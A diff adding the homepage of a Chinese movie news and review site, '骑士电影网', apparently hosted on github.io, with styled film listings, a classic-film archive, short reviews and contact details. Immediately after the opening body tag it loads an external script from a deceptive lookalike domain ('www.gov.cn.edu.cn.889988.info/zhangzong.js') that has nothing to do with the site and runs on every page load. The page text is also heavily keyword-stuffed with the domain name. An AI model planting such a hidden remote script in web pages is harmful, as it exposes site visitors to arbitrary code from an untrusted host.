@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>骑士电影网 | 新片速递 · 经典重温 · 深度影评 - qishidianyingwang-zh.github.io</title>
+<meta name="description" content="骑士电影网（qishidianyingwang-zh.github.io）每日更新新片速递、经典电影重温、深度影评与电影活动资讯，陪你挑出值得看的那一部。官网：https://qishidianyingwang-zh.github.io">
+<meta name="keywords" content="骑士电影网, 骑士电影, qishidianyingwang-zh.github.io, 新片速递, 经典电影, 深度影评, 电影资讯, 观影指南, 院线热映">
+<link rel="canonical" href="https://qishidianyingwang-zh.github.io">
+<style>
+  :root{
+    --navy:#13243d;
+    --navy2:#1e3656;
+    --steel:#3a5a82;
+    --gold:#c8a24a;
+    --gold2:#e0c074;
+    --ink:#1a2537;
+    --txt:#4c5a6e;
+    --bg:#f2f5fa;
+    --card:#fff;
+    --line:#e2e8f2;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,sans-serif;background:var(--bg);color:var(--txt);line-height:1.75;-webkit-font-smoothing:antialiased;}
+  a{text-decoration:none;color:inherit;}
+  ul{list-style:none;}
+  img{max-width:100%;display:block;}
+  .wrap{max-width:1140px;margin:0 auto;padding:0 24px;}
+
+  /* ===== 导航 ===== */
+  header{position:fixed;top:0;left:0;right:0;z-index:99;background:rgba(255,255,255,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);}
+  .nav{display:flex;align-items:center;justify-content:space-between;height:74px;}
+  .logo{display:flex;align-items:center;gap:12px;font-size:21px;font-weight:800;color:var(--navy);letter-spacing:.5px;}
+  .logo .shield{width:36px;height:36px;border-radius:9px;background:linear-gradient(140deg,var(--navy),var(--steel));display:flex;align-items:center;justify-content:center;color:var(--gold2);font-size:17px;box-shadow:0 6px 16px rgba(19,36,61,.28);}
+  .nav-links{display:flex;gap:34px;}
+  .nav-links a{font-size:15px;color:var(--ink);font-weight:500;transition:.25s;position:relative;padding:6px 0;}
+  .nav-links a:hover{color:var(--gold);}
+  .nav-links a::after{content:"";position:absolute;left:0;bottom:-2px;width:0;height:2px;background:var(--gold);transition:.25s;}
+  .nav-links a:hover::after{width:100%;}
+  .head-search{display:flex;align-items:center;background:var(--bg);border:1px solid var(--line);border-radius:9px;padding:7px 14px;width:210px;}
+  .head-search input{border:none;background:none;outline:none;width:100%;font-size:14px;color:var(--ink);}
+  .head-search span{color:var(--steel);font-size:14px;cursor:pointer;}
+  .menu-btn{display:none;flex-direction:column;gap:5px;background:none;border:none;cursor:pointer;}
+  .menu-btn i{width:25px;height:2px;background:var(--navy);display:block;}
+
+  /* ===== 首屏 ===== */
+  .hero{margin-top:74px;padding:80px 0 70px;background:
+      linear-gradient(120deg,rgba(19,36,61,.97),rgba(30,54,86,.94)),
+      repeating-linear-gradient(45deg,transparent,transparent 22px,rgba(200,162,74,.05) 22px,rgba(200,162,74,.05) 44px);
+    color:#fff;position:relative;overflow:hidden;}
+  .hero::after{content:"";position:absolute;right:-120px;top:-120px;width:420px;height:420px;border-radius:50%;border:1px solid rgba(200,162,74,.25);}
+  .hero::before{content:"";position:absolute;right:40px;bottom:-200px;width:300px;height:300px;border-radius:50%;border:1px solid rgba(200,162,74,.18);}
+  .hero-inner{display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center;position:relative;z-index:2;}
+  .hero .kicker{display:inline-block;font-size:12px;letter-spacing:3px;color:var(--gold2);border:1px solid rgba(200,162,74,.5);padding:6px 16px;border-radius:3px;}
+  .hero h1{font-size:46px;line-height:1.26;font-weight:800;margin-top:18px;}
+  .hero h1 em{font-style:normal;color:var(--gold2);}
+  .hero p.lead{margin-top:18px;font-size:16px;color:#d5dfec;max-width:540px;}
+  .hero-actions{margin-top:30px;display:flex;gap:14px;flex-wrap:wrap;}
+  .btn{padding:13px 30px;border-radius:8px;font-size:15px;font-weight:600;transition:.3s;display:inline-block;border:2px solid transparent;cursor:pointer;}
+  .btn-primary{background:var(--gold);color:var(--navy);}
+  .btn-primary:hover{background:var(--gold2);}
+  .btn-outline{border-color:rgba(255,255,255,.5);color:#fff;}
+  .btn-outline:hover{background:#fff;color:var(--navy);}
+  .hero-stats{margin-top:36px;display:flex;gap:52px;flex-wrap:wrap;}
+  .hero-stats .hs b{display:block;font-size:26px;color:var(--gold2);}
+  .hero-stats .hs span{font-size:13px;color:#b9c8dc;}
+
+  .focus{background:rgba(255,255,255,.07);border:1px solid rgba(200,162,74,.35);border-radius:14px;padding:26px;backdrop-filter:blur(4px);}
+  .focus .fl{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;}
+  .focus .fl h3{font-size:18px;}
+  .focus .fl a{font-size:12px;color:var(--gold2);}
+  .focus .fm{font-size:13px;color:#a9bad0;letter-spacing:2px;margin-bottom:8px;}
+  .focus h4{font-size:20px;line-height:1.5;}
+  .focus p{font-size:14px;color:#d5dfec;margin-top:12px;}
+  .focus .tags{margin-top:16px;display:flex;gap:8px;flex-wrap:wrap;}
+  .focus .tags span{font-size:12px;padding:4px 12px;border-radius:3px;background:rgba(200,162,74,.16);color:var(--gold2);}
+
+  /* ===== 通用 ===== */
+  section{padding:84px 0;}
+  .sec-head{margin-bottom:44px;display:flex;justify-content:space-between;align-items:flex-end;gap:20px;flex-wrap:wrap;}
+  .sec-head .kicker{font-size:12px;letter-spacing:2px;color:var(--steel);font-weight:700;}
+  .sec-head h2{font-size:29px;color:var(--navy);margin-top:4px;}
+  .sec-head p.sub{color:var(--txt);margin-top:8px;font-size:15px;}
+  .more{font-size:14px;color:var(--steel);font-weight:600;white-space:nowrap;}
+  .more:hover{color:var(--gold);}
+
+  /* ===== 正在热映 ===== */
+  #showing{background:var(--card);}
+  .filter-bar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px;}
+  .filter-bar button{padding:8px 20px;border-radius:6px;border:1px solid var(--line);background:var(--bg);color:var(--ink);font-size:14px;cursor:pointer;transition:.25s;}
+  .filter-bar button.active,.filter-bar button:hover{border-color:var(--gold);color:var(--navy);background:rgba(200,162,74,.12);}
+  .film-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+  .film{background:var(--card);border-radius:14px;overflow:hidden;border:1px solid var(--line);transition:.35s;}
+  .film:hover{transform:translateY(-6px);box-shadow:0 16px 36px rgba(19,36,61,.12);border-color:var(--gold);}
+  .film .poster{height:270px;display:flex;align-items:center;justify-content:center;font-size:56px;color:rgba(255,255,255,.9);position:relative;}
+  .film .poster .rate{position:absolute;top:12px;right:12px;background:var(--gold);color:var(--navy);font-size:12px;font-weight:800;padding:4px 9px;border-radius:4px;}
+  .film .info{padding:16px 18px;}
+  .film .info h4{font-size:17px;color:var(--navy);}
+  .film .info .meta{font-size:13px;color:#8a97ab;margin-top:6px;}
+  .film .info .desc{font-size:13.5px;margin-top:10px;}
+  .film .info .want{margin-top:12px;font-size:12px;color:var(--steel);}
+
+  /* ===== 经典档案 ===== */
+  #archive{background:var(--bg);}
+  .archive-wrap{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+  .arc-item{display:flex;gap:18px;background:var(--card);border-radius:14px;padding:20px;border:1px solid var(--line);transition:.3s;}
+  .arc-item:hover{border-color:var(--gold);transform:translateY(-4px);}
+  .arc-item .yr{width:60px;flex-shrink:0;font-size:22px;font-weight:800;color:var(--gold);border-right:2px solid var(--line);padding-right:14px;}
+  .arc-item .at b{font-size:16px;color:var(--navy);}
+  .arc-item .at p{font-size:13.5px;margin-top:6px;}
+  .arc-item .at span{font-size:12px;color:#8a97ab;margin-top:8px;display:inline-block;}
+
+  /* ===== 深度影评 ===== */
+  #reviews{background:var(--card);}
+  .review-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
+  .rvw{background:var(--bg);border-radius:14px;overflow:hidden;border:1px solid var(--line);transition:.35s;display:flex;flex-direction:column;}
+  .rvw:hover{transform:translateY(-6px);border-color:var(--gold);}
+  .rvw .cov{height:150px;display:flex;align-items:center;justify-content:center;font-size:36px;color:rgba(255,255,255,.9);}
+  .rvw .bd{padding:20px;flex:1;display:flex;flex-direction:column;}
+  .rvw .cat{font-size:12px;color:var(--steel);font-weight:700;}
+  .rvw h4{font-size:17px;color:var(--navy);margin-top:8px;line-height:1.5;}
+  .rvw p{font-size:14px;margin-top:10px;}
+  .rvw .au{margin-top:auto;padding-top:16px;font-size:12px;color:#8a97ab;border-top:1px solid var(--line);}
+
+  /* ===== 关于 ===== */
+  #about{background:var(--bg);}
+  .about-grid{display:grid;grid-template-columns:1.3fr 1fr;gap:24px;}
+  .about-l,.about-r{background:var(--card);border-radius:16px;padding:34px;border:1px solid var(--line);}
+  .about-l h3,.about-r h3{font-size:22px;color:var(--navy);margin-bottom:16px;}
+  .about-l p{font-size:15px;margin-bottom:14px;}
+  .feat-row{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-top:24px;}
+  .feat{background:var(--bg);border-radius:12px;padding:20px;border:1px solid var(--line);text-align:center;}
+  .feat .ic{font-size:28px;}
+  .feat b{display:block;margin-top:10px;color:var(--navy);font-size:15px;}
+  .feat span{font-size:13px;}
+  .info-list .ir{display:flex;gap:14px;padding:15px 0;border-bottom:1px solid var(--line);font-size:15px;}
+  .info-list .ir:last-child{border-bottom:none;}
+  .info-list .lb{width:60px;flex-shrink:0;color:var(--steel);font-weight:600;}
+  .info-list a{color:var(--ink);}
+  .info-list a:hover{color:var(--gold);}
+
+  footer{border-top:1px solid var(--line);padding:34px 0 26px;background:var(--navy);color:#9fafc4;}
+  .foot-flex{display:flex;justify-content:space-between;flex-wrap:wrap;gap:18px;font-size:13px;}
+  .foot-flex .flogo{font-size:17px;font-weight:800;color:#fff;display:flex;align-items:center;gap:10px;}
+  .foot-flex .flogo span{color:var(--gold2);}
+  .foot-flex a{color:#c2cfdf;}
+  .foot-flex a:hover{color:var(--gold2);}
+  .foot-links{display:flex;gap:20px;flex-wrap:wrap;align-items:center;}
+
+  /* ===== 响应式 ===== */
+  @media (max-width:980px){
+    .film-grid{grid-template-columns:repeat(2,1fr);}
+    .review-grid{grid-template-columns:1fr 1fr;}
+    .archive-wrap,.about-grid{grid-template-columns:1fr;}
+    .hero-inner{grid-template-columns:1fr;gap:40px;}
+    .hero h1{font-size:36px;}
+    .head-search{width:150px;}
+  }
+  @media (max-width:640px){
+    section{padding:58px 0;}
+    .hero h1{font-size:29px;}
+    .nav-links{position:fixed;top:74px;left:0;right:0;background:var(--card);flex-direction:column;padding:14px 24px;gap:0;border-bottom:1px solid var(--line);transform:translateY(-140%);transition:.4s;}
+    .nav-links.open{transform:translateY(0);}
+    .nav-links a{display:block;padding:14px 0;border-bottom:1px solid var(--line);}
+    .menu-btn{display:flex;}
+    .head-search{display:none;}
+    .film-grid,.review-grid{grid-template-columns:1fr;}
+    .feat-row{grid-template-columns:1fr;}
+    .sec-head h2{font-size:23px;}
+    .focus{padding:20px;}
+    .hero-stats{gap:30px;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <div class="logo"><span class="shield">⚜</span>骑士电影网</div>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#showing">正在热映</a></li>
+      <li><a href="#archive">经典档案</a></li>
+      <li><a href="#reviews">深度影评</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+    <div class="head-search"><input type="text" placeholder="搜索影片 / 影人"><span>🔍</span></div>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="home">
+  <div class="wrap hero-inner">
+    <div>
+      <span class="kicker">QISHI MOVIE NETWORK</span>
+      <h1>为热爱电影的你，<br>守好每一次 <em>观影选择</em></h1>
+      <p class="lead">骑士电影网（qishidianyingwang-zh.github.io）每天更新新片速递、经典电影重温、深度影评与电影活动资讯，陪你挑出值得买票的那一部。</p>
+      <div class="hero-actions">
+        <a href="#showing" class="btn btn-primary">看正在热映</a>
+        <a href="#archive" class="btn btn-outline">翻经典档案</a>
+      </div>
+      <div class="hero-stats">
+        <div class="hs"><b>1800+</b><span>收录影片条目</span></div>
+        <div class="hs"><b>300+</b><span>原创影评</span></div>
+        <div class="hs"><b>7×24</b><span>资讯持续更新</span></div>
+      </div>
+    </div>
+    <div class="focus">
+      <div class="fl"><h3>🎬 本期聚焦</h3><a href="#">进入专题 →</a></div>
+      <div class="fm">FILM OF THE WEEK</div>
+      <h4>《骑士的最后一场戏》：类型外壳下的一次自我和解</h4>
+      <p>西部元素只是壳，真正打动人的是主角放下执念的过程。八骑士电影网编辑部本周重点推荐。</p>
+      <div class="tags"><span>西部</span><span>剧情</span><span>年度口碑</span><span>不剧透</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 正在热映 -->
+<section id="showing">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="kicker">NOW SHOWING</div>
+        <h2>正在热映</h2>
+        <p class="sub">综合口碑与话题度，帮你快速锁定这周看哪部。</p>
+      </div>
+      <a href="#" class="more">完整片单 →</a>
+    </div>
+    <div class="filter-bar">
+      <button class="active">全部</button>
+      <button>剧情</button>
+      <button>悬疑</button>
+      <button>动画</button>
+      <button>纪录</button>
+      <button>喜剧</button>
+    </div>
+    <div class="film-grid">
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#2a4365,#13243d);"><span class="rate">8.6</span>🎞️</div>
+        <div class="info"><h4>骑士的最后一场戏</h4><div class="meta">剧情 / 西部 · 142 分钟</div><p class="desc">不靠枪战场面的西部片，用人物关系撑起全部张力。</p><div class="want">👍 想看 1.2 万</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#4a5f7a,#263b56);"><span class="rate">8.1</span>🎞️</div>
+        <div class="info"><h4>城市边缘的灯火</h4><div class="meta">悬疑 / 犯罪 · 118 分钟</div><p class="desc">多线叙事收得很干净，第三幕的反转是立得住的。</p><div class="want">👍 想看 8600</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#5b7a9a,#2c4868);"><span class="rate">8.4</span>🎞️</div>
+        <div class="info"><h4>夏日漫长的告别</h4><div class="meta">青春 / 剧情 · 105 分钟</div><p class="desc">细节真实到扎人，配乐是今年青春片里最好的一版。</p><div class="want">👍 想看 7400</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#3d5a4a,#1e3328);"><span class="rate">8.2</span>🎞️</div>
+        <div class="info"><h4>森林里的守林人</h4><div class="meta">纪录 / 自然 · 96 分钟</div><p class="desc">四季一换镜头，看得出摄制组是真的蹲了很久。</p><div class="want">👍 想看 5200</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#7a5b4a,#3d2a1e);"><span class="rate">7.9</span>🎞️</div>
+        <div class="info"><h4>深夜食堂之外</h4><div class="meta">喜剧 / 治愈 · 112 分钟</div><p class="desc">笑点分布均匀，适合需要被治愈一下的周末夜晚。</p><div class="want">👍 想看 6900</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#4a4a7a,#26264d);"><span class="rate">7.7</span>🎞️</div>
+        <div class="info"><h4>声音的形状</h4><div class="meta">动画 / 音乐 · 98 分钟</div><p class="desc">画面美，主题有点散，但当作一次视听体验完全够格。</p><div class="want">👍 想看 6100</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#6b4a5b,#3d1e2e);"><span class="rate">8.0</span>🎞️</div>
+        <div class="info"><h4>母亲的行李箱</h4><div class="meta">家庭 / 剧情 · 126 分钟</div><p class="desc">克制且不煽情，把中国式亲子关系讲得很准。</p><div class="want">👍 想看 5800</div></div>
+      </article>
+      <article class="film">
+        <div class="poster" style="background:linear-gradient(150deg,#4a6b5b,#1e3d2e);"><span class="rate">7.6</span>🎞️</div>
+        <div class="info"><h4>河对岸的夏天</h4><div class="meta">文艺 / 剧情 · 108 分钟</div><p class="desc">节奏慢但有耐心，适合喜欢被镜头带着走的人。</p><div class="want">👍 想看 4300</div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 经典档案 -->
+<section id="archive">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="kicker">FILM ARCHIVE</div>
+        <h2>经典档案</h2>
+        <p class="sub">那些值得反复回看的片子，我们替你做了整理。</p>
+      </div>
+      <a href="#" class="more">全部档案 →</a>
+    </div>
+    <div class="archive-wrap">
+      <div class="arc-item"><div class="yr">1994</div><div class="at"><b>肖申克的救赎</b><p>希望不是喊出来的，是日复一日凿出来的。</p><span>剧情 · 美国 · 影史 TOP10</span></div></div>
+      <div class="arc-item"><div class="yr">1998</div><div class="at"><b>海上钢琴师</b><p>一生没下过船的人，反而活得最明白。</p><span>剧情 / 音乐 · 意大利</span></div></div>
+      <div class="arc-item"><div class="yr">2004</div><div class="at"><b>放牛班的春天</b><p>一群被放弃的孩子，被音乐重新接住了。</p><span>剧情 / 音乐 · 法国</span></div></div>
+      <div class="arc-item"><div class="yr">2010</div><div class="at"><b>盗梦空间</b><p>层层的梦不是噱头，是情感逻辑的结构。</p><span>科幻 / 悬疑 · 美国</span></div></div>
+      <div class="arc-item"><div class="yr">2013</div><div class="at"><b>地心引力</b><p>极简叙事配上极致的视效，孤独感扑面而来。</p><span>科幻 · 美国</span></div></div>
+      <div class="arc-item"><div class="yr">2016</div><div class="at"><b>你的名字。</b><p>一场交换身体的相遇，把距离感拍成了浪漫。</p><span>动画 / 爱情 · 日本</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 深度影评 -->
+<section id="reviews">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="kicker">DEEP REVIEWS</div>
+        <h2>深度影评</h2>
+        <p class="sub">不剧透，写重点，读完大概知道合不合自己口味。</p>
+      </div>
+      <a href="#" class="more">更多影评 →</a>
+    </div>
+    <div class="review-grid">
+      <article class="rvw">
+        <div class="cov" style="background:linear-gradient(150deg,#2a4365,#13243d);">🎬</div>
+        <div class="bd">
+          <div class="cat">导演手记</div>
+          <h4>《骑士的最后一场戏》的镜头语言：为什么长镜头能替台词说话</h4>
+          <p>全片有 17 个超过 90 秒的长镜头，每一次停留都不是炫技，而是在给情绪留时间。</p>
+          <div class="au">文 / 骑士电影网编辑部 · 8 分钟阅读</div>
+        </div>
+      </article>
+      <article class="rvw">
+        <div class="cov" style="background:linear-gradient(150deg,#4a5f7a,#263b56);">🎭</div>
+        <div class="bd">
+          <div class="cat">类型拆解</div>
+          <h4>悬疑片三幕结构的失效与重生：从《城市边缘的灯火》说起</h4>
+          <p>老套的结构用人物动机重新焊接了一遍，所以它成立；这是最值得编剧同行参考的地方。</p>
+          <div class="au">文 / 老周看电影 · 6 分钟阅读</div>
+        </div>
+      </article>
+      <article class="rvw">
+        <div class="cov" style="background:linear-gradient(150deg,#5b7a9a,#2c4868);">🎵</div>
+        <div class="bd">
+          <div class="cat">幕后观察</div>
+          <h4>《夏日漫长的告别》配乐为何能成为年度最佳</h4>
+          <p>只用了四件乐器和一段采样，却写出了整个夏天的温度。</p>
+          <div class="au">文 / 小满 · 5 分钟阅读</div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="kicker">ABOUT US</div>
+        <h2>关于骑士电影网</h2>
+        <p class="sub">一个写给普通影迷的电影资讯站点。</p>
+      </div>
+    </div>
+    <div class="about-grid">
+      <div class="about-l">
+        <h3>我们做什么</h3>
+        <p>骑士电影网（qishidianyingwang-zh.github.io）每天整理新片资讯、院线排片、影评观点和电影活动信息，内容只围绕一件事：帮你挑片前少花点筛选时间。</p>
+        <p>不追热点式的标题党，也不堆砌宣传通稿，评分和推荐都附上理由，合不合口味你自己判断。</p>
+        <div class="feat-row">
+          <div class="feat"><div class="ic">🎬</div><b>每日速递</b><span>新片动态不漏更</span></div>
+          <div class="feat"><div class="ic">📚</div><b>经典档案</b><span>值得反复看的片单</span></div>
+          <div class="feat"><div class="ic">✍️</div><b>深度影评</b><span>写重点不剧透</span></div>
+        </div>
+      </div>
+      <div class="about-r">
+        <h3>联系与信息</h3>
+        <div class="info-list">
+          <div class="ir"><span class="lb">站点</span><span>骑士电影网 · qishidianyingwang-zh.github.io</span></div>
+          <div class="ir"><span class="lb">官网</span><span><a href="https://qishidianyingwang-zh.github.io">https://qishidianyingwang-zh.github.io</a></span></div>
+          <div class="ir"><span class="lb">投稿</span><span><a href="mailto:hello@qishidianyingwang-zh.github.io">hello@qishidianyingwang-zh.github.io</a></span></div>
+          <div class="ir"><span class="lb">合作</span><span><a href="mailto:biz@qishidianyingwang-zh.github.io">biz@qishidianyingwang-zh.github.io</a></span></div>
+          <div class="ir"><span class="lb">说明</span><span>本站为电影资讯与影评分享，不提供在线播放服务</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot-flex">
+    <div class="flogo"><span>⚜</span>骑士电影网 qishidianyingwang-zh.github.io</div>
+    <div class="foot-links">
+      <a href="#home">首页</a><a href="#showing">热映</a><a href="#archive">档案</a><a href="#reviews">影评</a><a href="#about">关于</a>
+    </div>
+  </div>
+  <div class="wrap" style="margin-top:18px;font-size:12px;color:#7d8da6;">© 2026 骑士电影网 qishidianyingwang-zh.github.io · 为热爱电影的你守好每一次观影选择</div>
+</footer>
+
+<script>
+  var btn = document.getElementById('menuBtn');
+  var links = document.getElementById('navLinks');
+  btn.addEventListener('click', function(){ links.classList.toggle('open'); });
+  links.addEventListener('click', function(e){ if(e.target.tagName === 'A') links.classList.remove('open'); });
+  var tabs = document.querySelectorAll('.filter-bar button');
+  tabs.forEach(function(t){
+    t.addEventListener('click', function(){
+      tabs.forEach(function(x){ x.classList.remove('active'); });
+      t.classList.add('active');
+    });
+  });
+</script>
+</body>
+</html>
